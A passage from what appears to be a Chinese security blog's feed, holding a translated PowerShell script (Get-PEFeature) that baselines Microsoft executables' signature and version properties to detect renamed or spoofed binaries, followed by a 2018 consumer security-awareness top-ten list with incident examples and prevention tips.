class="code"><pre><span class="line"><span class="comment"># GetPEFeature.ps1 - 一个PowerShell脚本，用于从PE文件中提取相关功能</span></span><br><span class="line"><span class="keyword">filter</span> Get-PEFeature &#123;</span><br><span class="line"><span class="comment">&lt;#</span></span><br><span class="line"><span class="comment"><span class="doctag">.SYNOPSIS</span></span></span><br><span class="line"><span class="comment">Retrieves key features from PE files that can be used to build detections.</span></span><br><span class="line"><span class="comment"><span class="doctag">.DESCRIPTION</span></span></span><br><span class="line"><span class="comment">Get-PEFeature extracts key features of PE files that are relevant to building detections.</span></span><br><span class="line"><span class="comment">Author: Matthew Graeber (@mattifestation)</span></span><br><span class="line"><span class="comment">License: BSD 3-Clause</span></span><br><span class="line"><span class="comment"><span class="doctag">.EXAMPLE</span></span></span><br><span class="line"><span class="comment">ls C:\Windows\System32\*.exe | Get-PEFeature</span></span><br><span class="line"><span class="comment"><span class="doctag">.EXAMPLE</span></span></span><br><span class="line"><span class="comment">ls C:\Windows\System32\*.exe | Get-PEFeature | ConvertTo-Json</span></span><br><span class="line"><span class="comment">#&gt;</span></span><br><span class="line"></span><br><span class="line">    [CmdletBinding()]</span><br><span class="line">    <span class="keyword">param</span> (</span><br><span class="line">        [Parameter(Position = <span class="number">0</span>, Mandatory = <span class="literal">$True</span>, ValueFromPipelineByPropertyName = <span class="literal">$True</span>)]</span><br><span class="line">        [String]</span><br><span class="line">        [Alias(<span class="string">'FullName'</span>)]</span><br><span class="line">        <span class="variable">$Path</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="variable">$HeaderBytes</span> = <span class="built_in">Get-Content</span> -TotalCount <span class="number">2</span> -Encoding Byte -Path <span class="variable">$Path</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="variable">$HeaderBytes</span>.Count <span class="nomarkup">-ne</span> <span class="number">2</span>) -or ([Text.Encoding]::ASCII.GetString(<span class="variable">$HeaderBytes</span>) <span class="nomarkup">-ne</span> <span class="string">'MZ'</span>)) &#123;</span><br><span class="line">        <span class="built_in">Write-Verbose</span> <span class="string">"<span class="variable">$Path</span> is not a valid PE file."</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$FileInfo</span> = <span class="built_in">Get-Item</span> -Path <span class="variable">$Path</span></span><br><span class="line">        <span class="variable">$FileVersionInfo</span> = <span class="variable">$FileInfo</span>.VersionInfo</span><br><span class="line"></span><br><span class="line">        <span class="comment"># If a path starts with %windir%, %ProgramFiles%, %ProgramFiles(x86)%, or %APPDATA%,</span></span><br><span class="line">        <span class="comment"># replace it to account for alternate system drives</span></span><br><span class="line">        <span class="variable">$ExpectedPath</span> = <span class="variable">$FileInfo</span>.DirectoryName <span class="nomarkup">-replace</span> <span class="string">"^$([Regex]::Escape(<span class="variable">$Env:windir</span>))"</span>, <span class="string">'%windir%'</span></span><br><span class="line">        <span class="variable">$ExpectedPath</span> = <span class="variable">$ExpectedPath</span> <span class="nomarkup">-replace</span> <span class="string">"^$([Regex]::Escape(<span class="variable">$Env:ProgramFiles</span>))"</span>, <span class="string">'%ProgramFiles%'</span></span><br><span class="line">        <span class="variable">$ExpectedPath</span> = <span class="variable">$ExpectedPath</span> <span class="nomarkup">-replace</span> <span class="string">"^$([Regex]::Escape($&#123;Env:ProgramFiles(x86)&#125;))"</span>, <span class="string">'%ProgramFiles(x86)%'</span></span><br><span class="line">        <span class="variable">$ExpectedPath</span> = <span class="variable">$ExpectedPath</span> <span class="nomarkup">-replace</span> <span class="string">"^$([Regex]::Escape(<span class="variable">$Env:APPDATA</span>))"</span>, <span class="string">'%APPDATA%'</span></span><br><span class="line">        <span class="variable">$ExpectedPath</span> = <span class="variable">$ExpectedPath</span> <span class="nomarkup">-replace</span> <span class="string">"^$([Regex]::Escape(<span class="variable">$Env:LOCALAPPDATA</span>))"</span>, <span class="string">'%LOCALAPPDATA%'</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$OriginalFilename</span> = <span class="variable">$FileVersionInfo</span>.OriginalFilename</span><br><span class="line">        <span class="variable">$FileDescription</span> = <span class="variable">$FileVersionInfo</span>.FileDescription</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Note that Get-AuthenticodeSignature will prefer catalog signatures over embedded Authenticode signatures.</span></span><br><span class="line">        <span class="variable">$SignatureInfo</span> = <span class="built_in">Get-AuthenticodeSignature</span> <span class="variable">$Path</span></span><br><span class="line">        <span class="variable">$SigningStatus</span> = <span class="variable">$SignatureInfo</span>.Status</span><br><span class="line">        <span class="variable">$OSBinary</span> = <span class="variable">$SignatureInfo</span>.IsOSBinary</span><br><span class="line"></span><br><span class="line">        <span class="variable">$SignerThumbprint</span> = <span class="literal">$null</span></span><br><span class="line">        <span class="variable">$SignerSubject</span> = <span class="literal">$null</span></span><br><span class="line">        <span class="variable">$RootThumbprint</span> = <span class="literal">$null</span></span><br><span class="line">        <span class="variable">$RootSubject</span> = <span class="literal">$null</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$SignatureInfo</span>.SignerCertificate) &#123;</span><br><span class="line">            <span class="variable">$SignerCertificate</span> = <span class="variable">$SignatureInfo</span>.SignerCertificate</span><br><span class="line">            <span class="comment"># These will be subject to change as the certificate approaches the end of its validity period</span></span><br><span class="line">            <span class="variable">$SignerThumbprint</span> = <span class="variable">$SignerCertificate</span>.Thumbprint</span><br><span class="line">            <span class="variable">$SignerSubject</span> = <span class="variable">$SignerCertificate</span>.Subject</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Build a signer chain so the root certificate info can be extracted.</span></span><br><span class="line">            <span class="variable">$SignerChain</span> = <span class="built_in">New-Object</span> -TypeName Security.Cryptography.X509Certificates.X509Chain</span><br><span class="line">            <span class="literal">$null</span> = <span class="variable">$SignerChain</span>.Build(<span class="variable">$SignerCertificate</span>)</span><br><span class="line"></span><br><span class="line">            <span class="variable">$RootCertificate</span> = <span class="variable">$SignerChain</span>.ChainElements[<span class="variable">$SignerChain</span>.ChainElements.Count - <span class="number">1</span>].Certificate</span><br><span class="line">            <span class="variable">$RootThumbprint</span> = <span class="variable">$RootCertificate</span>.Thumbprint</span><br><span class="line">            <span class="variable">$RootSubject</span> = <span class="variable">$RootCertificate</span>.Subject</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        [PSCustomObject] @&#123;</span><br><span class="line">            ExpectedPath = <span class="variable">$ExpectedPath</span></span><br><span class="line">            ExpectedFileName = <span class="variable">$FileInfo</span>.Name</span><br><span class="line">            OriginalFileName = <span class="variable">$OriginalFilename</span></span><br><span class="line">            FileDescription = <span class="variable">$FileDescription</span></span><br><span class="line">            SigningStatus = <span class="variable">$SigningStatus</span></span><br><span class="line">            IsOSBinary = <span class="variable">$OSBinary</span></span><br><span class="line">            SignerSubject = <span class="variable">$SignerSubject</span></span><br><span class="line">            SignerThumbprint = <span class="variable">$SignerThumbprint</span></span><br><span class="line">            RootSubject = <span class="variable">$RootSubject</span></span><br><span class="line">            RootThumbprint = <span class="variable">$RootThumbprint</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><img src="/Security/Microsoft可执行文件是怎么成为Microsoft可执行文件的/Get-PEFeature函数的示例输出.png" title="[Get-PEFeature函数的示例输出]"><p>　　这些属性共同构成良性Microsoft可执行文件的属性，在许多情况下，这些属性的任何偏差都应被视为可疑。请注意，“ExpectedPath”可能是最容易误报的假性财产。</p><h3 id="基线结果的应用"><a href="#基线结果的应用" class="headerlink" title="基线结果的应用"></a>基线结果的应用</h3><p>　　假设您收集了良性Microsoft PE属性的基线，让我们对前面介绍的规避攻击情形应用一些检测：</p><h4 id="1-一个签名的，可滥用的EXE被复制到另一个目录，重命名为良好的声音文件名并执行以逃避天真的命令行检测。"><a href="#1-一个签名的，可滥用的EXE被复制到另一个目录，重命名为良好的声音文件名并执行以逃避天真的命令行检测。" class="headerlink" title="1.一个签名的，可滥用的EXE被复制到另一个目录，重命名为良好的声音文件名并执行以逃避天真的命令行检测。"></a>1.一个签名的，可滥用的EXE被复制到另一个目录，重命名为良好的声音文件名并执行以逃避天真的命令行检测。</h4><p>　　已经为“预期的PowerShell”建立了定义，powershell.exe应该具有以下特征：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ExpectedPath     : %windir%\System32\WindowsPowerShell\v1.<span class="number">0</span></span><br><span class="line">ExpectedFileName : powershell.exe</span><br><span class="line">OriginalFileName : PowerShell.EXE.MUI</span><br><span class="line">FileDescription  : Windows PowerShell</span><br><span class="line">SigningStatus    : Valid</span><br><span class="line">IsOSBinary       : True</span><br><span class="line">SignerSubject    : CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US</span><br><span class="line">SignerThumbprint : <span class="number">419</span>E77AED546A1A6CF4DC23C1F977542FE289CF7</span><br><span class="line">RootSubject      : CN=Microsoft Root Certificate Authority <span class="number">2010</span>, O=Microsoft Corporation, L=Redmond, S=Washington, C=US</span><br><span class="line">RootThumbprint   : <span class="number">3</span>B1EFD3A66EA28B16697394703A72CA340A05BD5</span><br></pre></td></tr></table></figure></p><p>　　因此，当powershell.exe重命名为notepad.exe并从非标准目录执行时，我们怎么知道它实际上是powershell.exe而不依赖于文件散列？好吧，我们知道，因为重命名的notepad.exe将具有OriginalFileName“PowerShell.EXE.MUI”并且它将具有有效的Microsoft签名（即其完整性完整并链接到已知的Microsoft根证书）。ExpectedPath和ExpectedFileName字段都偏离了，应该生成警报。</p><h4 id="2-攻击者试图通过删除恶意可执行文件来“融入正常”，这种可执行文件表明它是一个良性的Microsoft可执行文件。"><a href="#2-攻击者试图通过删除恶意可执行文件来“融入正常”，这种可执行文件表明它是一个良性的Microsoft可执行文件。" class="headerlink" title="2.攻击者试图通过删除恶意可执行文件来“融入正常”，这种可执行文件表明它是一个良性的Microsoft可执行文件。"></a>2.攻击者试图通过删除恶意可执行文件来“融入正常”，这种可执行文件表明它是一个良性的Microsoft可执行文件。</h4><p>　　已知流行持久机制的二进制文件应基线化。假设已执行，应该预期onedrive.exe具有以下属性：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ExpectedPath     : %LOCALAPPDATA%\Microsoft\OneDrive</span><br><span class="line">ExpectedFileName : OneDrive.exe</span><br><span class="line">OriginalFileName : OneDrive.exe</span><br><span class="line">FileDescription  : Microsoft OneDrive</span><br><span class="line">SigningStatus    : Valid</span><br><span class="line">IsOSBinary       : False</span><br><span class="line">SignerSubject    : CN=Microsoft Corporation, OU=MOPR, O=Microsoft Corporation, L=Redmond, S=Washington, C=US</span><br><span class="line">SignerThumbprint : <span class="number">5</span>EAD300DC7E4D637948ECB0ED829A072BD152E17</span><br><span class="line">RootSubject      : CN=Microsoft Root Certificate Authority, DC=microsoft, DC=com</span><br><span class="line">RootThumbprint   : CDD4EEAE6000AC7F40C3802C171E30148030C072</span><br></pre></td></tr></table></figure></p><p>　　在这种情况下，丢弃的恶意可执行文件将保留ExpectedFilePath和ExpectedFileName属性，但不保留其他属性。</p><h4 id="3-攻击者后门系统可执行文件。"><a href="#3-攻击者后门系统可执行文件。" class="headerlink" title="3.攻击者后门系统可执行文件。"></a>3.攻击者后门系统可执行文件。</h4><p>　　与前一个方案类似，后端可执行文件将保留ExpectedFilePath，ExpectedFileName和FileDescription属性，但不保留其他任何属性。</p><h4 id="4-攻击者欺骗Microsoft数字签名并使用“Microsoft”证书签署其恶意代码。"><a href="#4-攻击者欺骗Microsoft数字签名并使用“Microsoft”证书签署其恶意代码。" class="headerlink" title="4.攻击者欺骗Microsoft数字签名并使用“Microsoft”证书签署其恶意代码。"></a>4.攻击者欺骗Microsoft数字签名并使用“Microsoft”证书签署其恶意代码。</h4><p>　　如果攻击者使用看起来像Microsoft证书链的证书链对其恶意软件进行签名，则包含“Microsoft”的SignerSubject和/或RootSubject字段不应具有列入白名单的RootThumbprint值之一，应该被认为是非常可疑的。</p><h3 id="其他提议的属性"><a href="#其他提议的属性" class="headerlink" title="其他提议的属性"></a>其他提议的属性</h3><p>　　您可能考虑手动添加到基线列表的一个属性是“KnownAbused”属性，表示它是一个已知被攻击者滥用的二进制文件。这将允许您将相关的“生活在陆地上”的样式检测集中在一起。对于标记为已知滥用的二进制文件的一个很好的初始参考是监视来自Microsoft的规范WDAC黑名单规则集。</p><p>　　如果您要跟踪已知的滥用软件，您还可以考虑添加一个字段，其中包含一组命令行开关，用于给定的可执行文件，攻击者难以逃避。</p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>　　鉴于故意回避的交易技术的威胁，重要的是不仅要知道如何识别，例如，使powershell.exe powershell.exe成为什么，但是有一个实际的手段来做出这样的决定也很重要。并观察偏差。</p><p>　　我希望能够让您确信本文中强调的PE属性的重要性，并且如果您还没有这些属性，请将端点安全供应商光学器件请求这些属性。</p>]]></content>
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 可执行文件 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2018安全意识TOP-10</title>
      <link href="/Security/2018%E5%AE%89%E5%85%A8%E6%84%8F%E8%AF%86TOP-10/"/>
      <url>/Security/2018%E5%AE%89%E5%85%A8%E6%84%8F%E8%AF%86TOP-10/</url>
      <content type="html"><![CDATA[<h3 id="一、安全意识TOP-10-2018"><a href="#一、安全意识TOP-10-2018" class="headerlink" title="一、安全意识TOP-10 2018"></a>一、安全意识TOP-10 2018</h3><table><thead><tr><th>TOP 10</th><th>描述</th></tr></thead><tbody><tr><td>A1-利用漏洞攻击</td><td>除拒绝服务攻击事件和后门攻击事件之外，利用信息系统配置缺陷、协议缺陷、程序缺陷等漏洞，对信息系统实施攻击的信息安全事件。</td></tr><tr><td>A2-信息泄露事件</td><td>因误操作、软硬件缺陷或电磁泄漏等因素导致信息系统中的保密、敏感、个人隐私等信息暴露于未经授权者而导致的信息安全事件。</td></tr><tr><td>A3-计算机病毒事件</td><td>蓄意制造、传播计算机病毒，或是因受到计算机病毒影响而导致的信息安全事件。</td></tr><tr><td>A4-木马事件</td><td>蓄意制造、传播特洛伊木马程序，或是因受到特洛伊木马程序影响而导致的信息安全事件。</td></tr><tr><td>A5-钓鱼事件</td><td>利用欺骗性的计算机网络技术，使用户泄漏重要信息而导致的信息安全事件。</td></tr><tr><td>A6-电信诈骗</td><td>利用各种渠道取得被害人的信任和注意，实施诈骗行为。</td></tr><tr><td>A7-网络设备监视及窃听事件</td><td>通过技术手段，利用网络监控或窃听设备，窃取用户个人隐私等而导致的信息安全事件。</td></tr><tr><td>A8-网页内嵌恶意代码事件</td><td>蓄意制造、传播网页内嵌恶意代码，或是因受到网页内嵌恶意代码影响而导致的信息安全事件。</td></tr><tr><td>A9-信息篡改事件</td><td>未经授权将信息系统中的信息更换为攻击者所提供的信息而导致的信息安全事件。</td></tr><tr><td>A10-信息丢失事件</td><td>因误操作、人为蓄意或软硬件缺陷等因素导致信息系统中的信息丢失而导致的信息安全事件。</td></tr></tbody></table><h3 id="二、利用漏洞攻击事件"><a href="#二、利用漏洞攻击事件" class="headerlink" title="二、利用漏洞攻击事件"></a>二、利用漏洞攻击事件</h3><p>　　利用漏洞攻击事件是指除拒绝服务攻击事件和后门攻击事件之外，利用信息系统配置缺陷、协议缺陷、程序缺陷等漏洞，对信息系统实施攻击的信息安全事件。<br>　　利用漏洞攻击事件属于网络攻击事件的一种。网络攻击事件是指通过网络或其他技术手段，利用信息系统的配置缺陷、协议缺陷、程序缺陷或使用暴力攻击对信息系统实施攻击，并造成信息系统异常或对信息系统当前运行造成潜在危害的安全事件。</p><p><strong>影响：</strong></p><ul><li>各种可能的负面后果包括：数据泄露、损坏</li><li>未授权访问</li><li>植入病毒木马</li></ul><p><strong>案例：</strong></p><ul><li><p>支付宝一键克隆<br>腾讯玄武安全实验室揭露了“应用克隆”漏洞；此漏洞广泛影响安卓系统的手机软件，例如支付宝，用户只要点击短信链接或扫描二维码就可能被克隆，造成财产损失和信息泄露</p></li><li><p>噩梦公式二代<br>黑客利用Office 内在的功能（公式编辑器）发起的攻击(“噩梦公式二代”)，打开恶意文档就会中招。此漏洞会趁着用户没打补丁的空挡，在你不知情的情况下控制你的电脑。</p></li><li><p>“WannaCry”勒索病毒<br>“WannaCry”勒索病毒攻击爆发，国内外多所高校及企业因为漏洞较多，遭遇勒索软件入侵，导致大量电脑文件被加密，被迫支付赎金或无法再使用。</p></li></ul><p><strong>预防方案：</strong></p><ul><li>安装杀毒软件</li><li>安装防火墙</li><li>及时更新电脑的系统补丁</li><li>养成不用电脑时关闭联网的习惯</li></ul><h3 id="三、信息泄露事件"><a href="#三、信息泄露事件" class="headerlink" title="三、信息泄露事件"></a>三、信息泄露事件</h3><p>信息泄露事件是指因误操作、软硬件缺陷或电磁泄漏等因素导致信息系统中的保密、敏感、个人隐私等信息暴露于未经授权者而导致的信息安全事件。<br>信息泄露事件常见于网络个人信息泄露，包括基本信息、设备信息、账户信息、隐私信息、社会关系信息和网络行为信息等。不法人员利用恶意程序、各类钓鱼和黑客攻击非法获取个人信息，谋取利益。大规模信息泄露事件频发。</p><p><strong>影响：</strong></p><ul><li>各种可能的负面后果包括：个人信息的泄露、人身威胁、财产损失</li></ul><p><strong>案例：</strong></p><ul><li><p>“晒”机票泄露个人信息<br>朋友圈晒机票有风险。只要将你的条形码上传至免费解码网，就能知道你姓名和旅程所有信息，并可能导致后面的退票诈骗及其他信息泄露导致的财产损失。</p></li><li><p>滴滴顺风车乘客信息泄露<br>空姐在郑州航空港区乘坐滴滴顺风车遇害一案引发社会广泛关注。乘客个人信息泄露，造成严重后果。</p></li><li><p>二维码泄露被复制<br>微商赵女士在网络交易过程中，不法分子以自己支付宝余额不足为借口，提出让赵女士将付款码发给自己扫码付款。收到付款码截图后，不法分子随即进行复制，盗刷了赵女士的银行账户。</p></li></ul><p><strong>预防方案：</strong></p><ul><li>不在非官方网站填写个人敏感信息</li><li>微信和QQ不加不明身份的好友</li><li>不轻易连接公共场所提供的Wi-Fi以及免费Wi-Fi</li><li>连接不安全的Wi-Fi时不填写任何密码以及敏感信息</li><li>处理照片、车票、快递单等包含个人信息的资料时，一定要遮蔽姓名、卡号和条形码</li></ul><h3 id="四、计算机病毒事件"><a href="#四、计算机病毒事件" class="headerlink" title="四、计算机病毒事件"></a>四、计算机病毒事件</h3><p>　　计算机病毒事件是指蓄意制造、传播计算机病毒，或是因受到计算机病毒影响而导致的信息安全事件。<br>计算机病毒是一个程序、一段可执行代码，类似于生物病毒，具有隐蔽性、感染性、潜伏性、可激发性、破坏性。它们能自身附着在各类文件上，当文件被复制或从一个用户传送到另一个用户时，它们就随同文件一起蔓延开来。随着智能电子设备的使用，影响范围越来越广。计算机病毒已不再局限于传统的台式机和笔记本电脑，移动终端同样也会遭受病毒破坏。</p><p><strong>影响：</strong></p><ul><li>各种可能的负面后果包括：引起终端设备故障、破坏数据、远程操控、个人信息的泄露、未授权的访问、财产损失等。</li></ul><p><strong>案例：</strong></p><ul><li><p>“锁机病毒”勒索钱财<br>锁机生成器病毒，仿冒各类软件诱导用户安装，锁定手机并勒索用户钱财。</p></li><li><p>“短信拦截马”窃取隐私<br>“短信拦截马”这个病毒活跃在各大Android平台上，以窃取用户隐私为目的，通过拦截并监视短信，利用盗取的用户信息盗刷银行账户、偷取用户财产。</p></li><li><p>“短信拦截马”窃取隐私<br>手机突然收到大量扣费短信息。这是用户手机下载了暗扣类应用（俗称“变脸窃贼”）所致，表面上所需权限正常，其实内含使手机付费接受短信等有害权限。</p></li></ul><p><strong>预防方案：</strong></p><ul><li>安装杀毒软件以及防火墙</li><li>定期对计算机或终端设备进行扫描并及时更新杀毒软件的补丁</li><li>使用正版软件，不随意从非官方渠道下载软件或APP（尤其是“破解版“）</li><li>不上不熟悉且引发安全告警的网站</li><li>从非官方网页安装软件或APP时注意核对文件信息</li><li>不轻易点击收到的邮件链接及附件</li></ul><h3 id="五、木马事件"><a href="#五、木马事件" class="headerlink" title="五、木马事件"></a>五、木马事件</h3><p>　　木马事件是指蓄意制造、传播特洛伊木马程序，或是因受到特洛伊木马程序影响而导致的信息安全事件。<br>木马程序通常通过一段特定的程序（木马程序）来控制另一台计算机，打开一个或几个端口，攻击者利用这些打开的端口进入电脑系统。隐蔽性是木马的首要特点，木马程序发展到今天，对用户的威胁越来越大，使普通用户很难在中毒后发觉。一旦被木马控制，电脑或智能设备将毫无秘密可言。</p><p><strong>影响：</strong></p><ul><li>各种可能的负面后果包括：远程监控、危害本机信息安全（盗取QQ帐号、游戏帐号甚至银行帐号），将本机作为工具来攻击其他设备等。</li></ul><p><strong>案例：</strong></p><ul><li><p>公共充电桩易藏木马<br>.15晚会上，安全专家曾把藏身于免费充电桩中的木马病毒揪了出来。通过实验得知，通过使用公共充电桩给手机充电，黑客可控制手机，实现手机中的照片查看、短信发送、窃取手机使用者的验证码，甚至进行消费。</p></li><li><p>短信链接藏木马，银行卡被盗<br>市民王女士取钱时，发现这张一直锁在家中的银行卡里只剩十多块钱，另外16万元存款莫名消失。原来，王女士的手机曾收到过一条名为“老同学照片”的短信链接，手机中了木马，导致存款被盗。</p></li><li><p>QQ营销病毒，强行添加好友<br>QQ营销病毒传播感染量高达约15万余台。感染用户电脑后会强行添加QQ好友、QQ群，邀请好友加群并自动发邮件给QQ营销号。</p></li></ul><p><strong>预防方案：</strong></p><ul><li>安装杀毒软件以及防火墙</li><li>定期对电脑进行扫描并及时更新杀毒软件的补丁</li><li>使用正版软件，不随意从非官方渠道下载应用或APP（尤其是“破解版“）</li><li>不上不熟悉且引发安全告警的网站</li><li>从非官方网页安装APP时注意核对文件信息</li><li>不轻易点击收到的邮件链接及附件</li></ul><h3 id="六、钓鱼事件"><a href="#六、钓鱼事件" class="headerlink" title="六、钓鱼事件"></a>六、钓鱼事件</h3><p>　　钓鱼事件是指利用欺骗性的计算机网络技术，使用户泄漏重要信息而导致的信息安全事件。<br>最典型的网络钓鱼攻击通过将收信人引诱到一个通过精心设计与目标组织的网站非常相似的钓鱼网站上，并获取收信人在此网站上输入的个人敏感信息，通常这个攻击过程不会让受害者警觉，并利用这些获取不正当利益。</p><p><strong>影响：</strong></p><ul><li>各种可能的负面后果包括：信息泄露、经济损失等。</li></ul><p><strong>案例：</strong></p><ul><li><p>邮件钓鱼，被骗汇款<br>西安一外贸公司收到”伪造邮件”，由于没有对收来的邮件进行辨别，向国外供货商汇款，被骗了40多万元。</p></li><li><p>点“微信红包”手机中毒<br>多位网友遭遇了疑似“微信红包”骗钱的事，点开“微信红包”后不但没有领到钱，手机反而中了“木马病毒”导致账户内的钱被转走。</p></li><li><p>Wi-Fi钓鱼，银行账户被盗<br>株洲市张女士，在一家商场内发现一个没设密码的Wi-Fi。连接Wi-Fi后，通过手机银行支付方式在淘宝上购买了衣服。随后，手机连续收到短信提醒，其信用卡被盗刷4笔，总金额高达8000多元。</p></li></ul><p><strong>预防方案：</strong></p><ul><li>不轻易点击不认识的人或公司发来的邮件链接，在点开的网页上不轻易输入用户名和密码</li><li>输入前检查网站名是否正确；比如说<a href="http://www.mail.qq.com和www.mail.qq.cn" target="_blank" rel="noopener">www.mail.qq.com和www.mail.qq.cn</a></li><li>上官方及受信任的网站（网站名前有https字样），注意浏览器的安全提醒</li><li>不轻易扫描各种二维码</li></ul><h3 id="七、电信诈骗"><a href="#七、电信诈骗" class="headerlink" title="七、电信诈骗"></a>七、电信诈骗</h3><p>　　电信诈骗是指利用各种渠道取得被害人的信任和注意，实施诈骗行为。<br>电信诈骗即是虚假信息诈骗，借助于手机、固定电话、网络等通信工具和现代的技术等实施的非接触式的诈骗犯罪。随着网络的发展，可以说是迅速地发展蔓延，给人民群众造成了很大的损失。</p><p><strong>影响：</strong></p><ul><li>各种可能的负面后果包括：财产经济损失、人身伤害等。</li></ul><p><strong>案例：</strong></p><ul><li><p>伪装政府机关诈骗<br>贸易委员会发现了多起伪装成中国大使馆的诈骗电话。犯罪分子伪装成中国大使馆诈骗250万美元。</p></li><li><p>二维码诈骗<br>李先生收到一条某电商网站的推销短信，通过手机扫描了店主发来的二维码后，进入一个支付界面，输入银行账号和密码后却显示支付失败，之后却发现自己的银行账号被转走10000余元。</p></li><li><p>假账号诈骗<br>徐玉玉电信诈骗案：诈骗团伙以发放助学金的名义，让徐玉玉转账激活卡片，盗取了9900元学费，最终导致徐玉玉心脏骤停而离世。</p></li></ul><p><strong>预防方案：</strong></p><ul><li>不要相信任何在电话里提到的公检法部门的侦查、汇款；不要相信网络或传真的“法院传票”</li><li>不要轻易扫描他人的付款二维码需要输入密码账号时，仔细核对支付页面</li><li>在电话中提及转账、汇款、罚款等说法时，一定要通过官网渠道进行二次确认</li><li>不要随便相信中奖信息，尤其是先交“个人所得税”、“公证费”、“转账手续费”等中奖信息</li></ul><h3 id="八、网络设备监视及窃听事件"><a href="#八、网络设备监视及窃听事件" class="headerlink" title="八、网络设备监视及窃听事件"></a>八、网络设备监视及窃听事件</h3><p>　　网络设备监视及窃听事件是指利用网络监控或窃听设备，获取设备控制权从而窃取用户个人隐私等而导致的信息安全事件。<br>网络设备监视及窃听事件主要涉及侵犯个人隐私，利用摄像头为代表的物联网设备对政府、企业、个人进行信息窃取。</p><p><strong>影响：</strong></p><ul><li>各种可能的负面后果包括：个人隐私泄露，财产损失、人格利益受损及精神痛苦等。</li></ul><p><strong>案例：</strong></p><ul><li><p>麦克风窃听<br>攻击者首先向目标发送钓鱼邮件，恶意程序隐藏Microsoft Word 文档中，一旦感染目标之后利用恶意程序控制设备的麦克风去记录对话、屏幕截图、文档和密码。</p></li><li><p>监控摄像头直播<br>某视频直播网站引发热议，在该网站上可以看到全国各地甚至国外的监控摄像头的免费直播，包括街景、餐厅、商店、办公室，甚至市民家中情况。</p></li><li><p>手机摄像头拍照<br>vivo NEX手机开卖，“隐藏式升降式摄像头”引热议。在QQ浏览器中打开携程网站（APP权限开启），vivoNEX的前置摄像头突然自动升了起来，然后默默“扫描”了一眼再缩回去。</p></li></ul><p><strong>预防方案：</strong></p><ul><li>不用摄像头的时候，盖住摄像头</li><li>不在摄像头范围内，泄露账户密码等隐私信息</li><li>定期对电脑进行扫描并及时更新杀毒软件的补丁</li></ul><h3 id="九、网页内嵌恶意代码事件"><a href="#九、网页内嵌恶意代码事件" class="headerlink" title="九、网页内嵌恶意代码事件"></a>九、网页内嵌恶意代码事件</h3><p>　　网页内嵌恶意代码事件是指蓄意制造、传播网页内嵌恶意代码，或是因受到网页内嵌恶意代码影响而导致的信息安全事件。<br>网页恶意代码(又称“网页病毒”)是利用网页来进行破坏的病毒。当用户登录某些含有网页病毒的网站时，网页病毒便被悄悄激活，这些病毒一旦激活，可以利用系统的一些资源进行破坏。</p><p><strong>影响：</strong></p><ul><li>各种可能的负面后果包括：IE默认搜索引擎被修改、系统启动时弹出广告信息、营销诈骗、信息泄露。</li></ul><p><strong>案例：</strong></p><ul><li><p>知名网站的广告被“挂马攻击”<br>国内多家知名软件、网站的广告页面遭到病毒团伙的“挂马攻击”只要用户访问该页面，即会触发浏览器漏洞。</p></li><li><p>恶意代码注入合法网站<br>Websense安全实验室监测到一场大规模恶意代码注入攻击正在不断袭击合法网站，已经有上万个合法网站受到攻击，无数的Web用户受到感染。</p></li><li><p>网站感染按键记录器<br>WordPress 网站感染了按键记录器。恶意程序会记录密码，以及管理员或访客输入的任何内容。恶意程序除了安装按键记录器还，还安装了挖矿脚本，利用访客的计算机挖掘数字货币。</p></li></ul><p><strong>预防方案：</strong></p><ul><li>安装杀毒软件以及防火墙</li><li>定期对电脑进行扫描并及时更新杀毒软件的补丁</li><li>不上不熟悉以及引发安全警报的网站</li></ul><h3 id="十、信息篡改事件"><a href="#十、信息篡改事件" class="headerlink" title="十、信息篡改事件"></a>十、信息篡改事件</h3><p>　　信息篡改事件是指在未经授权的情况下，将信息系统中的信息更换为攻击者所提供的信息而导致的信息安全事件。<br>信息篡改事件通常体现在网页、商务数据、金融数据、个人信息等保存在数据库中的资料被人为修改，从中牟利，例如数据篡改、网页篡改等。攻击者获取受害网站权限或个人信息的方法都很常见，包括SQL注入和口令盗取，其中最常见的就是文件包含漏洞。</p><p><strong>影响：</strong></p><ul><li>各种可能的负面后果包括：访问控制失效、个人信息泄露、财产损失。</li></ul><p><strong>案例：</strong></p><ul><li><p>银行存款被篡改<br>俄罗斯一安全公司实验室介绍了他们的一些调查结果，表明一个或多个黑客群体针对至少140 家银行和组织进行了这种攻击，旨在盗取凭证和金钱。</p></li><li><p>政府网站被篡改<br>江苏警方奔赴马来西亚打掉一个由四人组成的黑客团伙，个别政府网站遭黑客非法侵入，会被链接到境外的赌博网站。</p></li><li><p>虚拟货币客户端被篡改<br>Myetherwallet（MEW）是网络上最受欢迎的以太坊钱包客户端，很不幸其在北京时间4月24日晚9点遭受DNS劫持攻击。许多用户报告缺失资金，造成经济损失。</p></li></ul><p><strong>预防方案：</strong></p><ul><li>重要信息和有价值的资料应定期备份</li><li>不要把存款、股票等有价证券放在同一个平台</li></ul><h3 id="十一、信息丢失事件"><a href="#十一、信息丢失事件" class="headerlink" 